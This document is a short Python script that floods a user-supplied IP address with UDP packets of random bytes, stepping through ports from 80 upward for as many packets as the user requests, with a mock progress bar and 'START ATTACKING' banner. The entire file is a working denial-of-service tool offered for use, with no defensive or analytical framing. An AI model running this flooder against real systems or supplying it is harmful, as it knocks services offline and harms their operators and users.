import sys
import os
import time
import socket
import random
import ipaddress



# Function to print the atack progress
def printAttackSetup():
    print ("Starting Attack 0% ")
    time.sleep(2)
    print ("[###] Setting Up Attack 25% ")
    time.sleep(.3)
    print ("[#####]Preparing Atack 50%")
    time.sleep(1)
    print ("[#######]Almost Done 75%")
    time.sleep(.2)
    print ("[##########]START ATTACKING 100%")
    time.sleep(.5)


# Function to print information
def printInformation():
    print ()
    print("#####################")
    print("Name: Christos Kappa")
    print("#####################")
    print()
 

# Function to configure the number of attacks will occur (default 1000)

def setupAttackNumber():
    global attacknumber
    try:
        attacknumber=int(input("How manny Attacks Would You Like To Send?")) or 100000
    except:
       
        attacknumber=1000

# Function to start the DDoS The target IP and Port
# It is dynamic from the port 80 to number of attacks e.g 80,81 if its 2 attacks and so on
def atack():
    sent = 0
    global ip,port
    while sent < attacknumber:
     # Sending the random bytes to the target ip and port 
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))


printInformation()
ip_in_int = int(ipaddress.ip_address(input("Enter Target IP:"))) #Asking user to enter the target ip
ip = ipaddress.ip_address(ip_in_int).__str__() #Converting IP to Integer
port = 80 #Entry port from which the script will start flooding 
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #Creating datagram server socket which uses IPv4 address scheme
attacknumber =1 #Number of attacks will happend (default 1000)
bytes = random._urandom(1490) #creating random bytes for the flood 
setupAttackNumber()
printAttackSetup()
atack()

